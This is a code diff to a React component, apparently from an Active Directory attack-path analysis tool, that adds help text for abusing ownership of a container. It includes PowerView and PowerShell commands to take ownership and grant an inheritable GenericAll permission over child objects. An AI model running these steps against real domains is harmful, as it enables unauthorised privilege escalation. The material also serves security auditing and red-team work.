@@ -17,6 +17,7 @@
 import { FC } from 'react';
 import { Link, Typography } from '@mui/material';
 import { EdgeInfoProps } from '../index';
+import CodeController from '../CodeController/CodeController';
 
 const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
     sourceName,
@@ -1017,6 +1018,60 @@ const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> =
                         its gPLink attribute, making all child users and computers apply the malicious GPO and execute
                         arbitrary commands.
                     </Typography>
+                </>
+            );
+        case 'Container':
+            return (
+                <>
+                    <Typography variant='body2'>
+                        To change the ownership of the object, you may use the Set-DomainObjectOwner function in
+                        PowerView.
+                    </Typography>
+                    <Typography variant='body2'>
+                        You may need to authenticate to the Domain Controller as{' '}
+                        {sourceType === 'User'
+                            ? `${sourceName} if you are not running a process as that user`
+                            : `a member of ${sourceName} if you are not running a process as a member`}
+                        . To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object
+                        (these examples comes from the PowerView help documentation):
+                    </Typography>
+                    <Typography component={'pre'}>
+                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
+                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
+                    </Typography>
+                    <Typography variant='body2'>
+                        Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a
+                        process as a member of (the group that holds this ACE):
+                    </Typography>
+                    <Typography component={'pre'}>
+                        {'Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y'}
+                    </Typography>
+                    <Typography variant='body2'>
+                        Now with ownership of the container object, you may grant yourself the GenericAll permission
+                        inherited to child objects.
+                    </Typography>
+                    <Typography variant='body2'>This can be done with PowerShell:</Typography>
+                    <CodeController>
+                        {`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
+                        $principalName = "principal"     # SAM account name of principal
+                        
+                        # Find the certificate template
+                        $template = [ADSI]"LDAP://$containerDN"
+                        
+                        # Construct the ACE
+                        $account = New-Object System.Security.Principal.NTAccount($principalName)
+                        $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
+                        $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
+                            $sid,
+                            [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+                            [System.Security.AccessControl.AccessControlType]::Allow,
+                            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
+                        )
+                        # Add the new ACE to the ACL
+                        $acl = $template.psbase.ObjectSecurity
+                        $acl.AddAccessRule($ace)
+                        $template.psbase.CommitChanges()`}
+                    </CodeController>
                 </>
             );
         case 'CertTemplate':
